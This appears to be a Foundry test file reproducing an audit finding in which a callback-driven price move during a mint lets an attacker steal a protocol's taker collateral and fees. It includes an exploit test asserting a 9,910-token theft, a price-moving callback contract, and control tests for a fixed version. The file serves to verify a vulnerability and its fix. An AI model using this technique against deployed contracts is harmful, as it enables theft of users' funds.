// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit, Tok, Pool, DiamondFixed} from
    "./63168-h-2-all-taker-collateral-and-collected-fees-can-be-stolen-by.sol";

contract FixedPayer {
    function tokenRequestCB() external {}
}

contract MovingPayer {
    Pool public pool;

    constructor(Pool _pool) {
        pool = _pool;
    }

    function tokenRequestCB() external {
        pool.swapTo(10_000, address(this));
    }
}

contract Finding63168Test is Test {
    function test_exploit_steals_9910_token1() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.token1().balanceOf(address(e)) - 90 ether, 9_910 ether, "profit 9910");
        assertEq(e.token1().balanceOf(address(e.diamond())), 0, "taker token1 gone");
        assertEq(e.diamond().spent1(), 10_000 ether, "mint spent 10000");
        assertEq(e.diamond().charged0(), 10 ether, "user charged 10 token0");
    }

    function test_control_matching_quote_leaves_taker_collateral() public {
        Tok token0 = new Tok("T0");
        Tok token1 = new Tok("T1");
        Pool pool = new Pool(token0, token1);
        DiamondFixed fixedDiamond = new DiamondFixed(token0, token1, pool);
        FixedPayer payer = new FixedPayer();
        token0.mint(address(payer), 10 ether);
        token0.mint(address(fixedDiamond), 100 ether);
        token1.mint(address(fixedDiamond), 10_000 ether);
        // price stays 100, so mint spends the quoted 10 token0 and matches
        fixedDiamond.newMaker(address(payer));
        assertEq(token1.balanceOf(address(fixedDiamond)), 10_000 ether, "collateral untouched");
    }

    function test_control_reverts_if_callback_moves_the_price() public {
        Tok token0 = new Tok("T0");
        Tok token1 = new Tok("T1");
        Pool pool = new Pool(token0, token1);
        DiamondFixed fixedDiamond = new DiamondFixed(token0, token1, pool);
        MovingPayer payer = new MovingPayer(pool);
        token0.mint(address(pool), 0.09 ether);
        token0.mint(address(payer), 10 ether);
        token1.mint(address(payer), 90 ether);
        token0.mint(address(fixedDiamond), 100 ether);
        token1.mint(address(fixedDiamond), 10_000 ether);
        vm.expectRevert(bytes("mint mismatch"));
        fixedDiamond.newMaker(address(payer));
        assertEq(token1.balanceOf(address(fixedDiamond)), 10_000 ether, "collateral restored");
    }
}
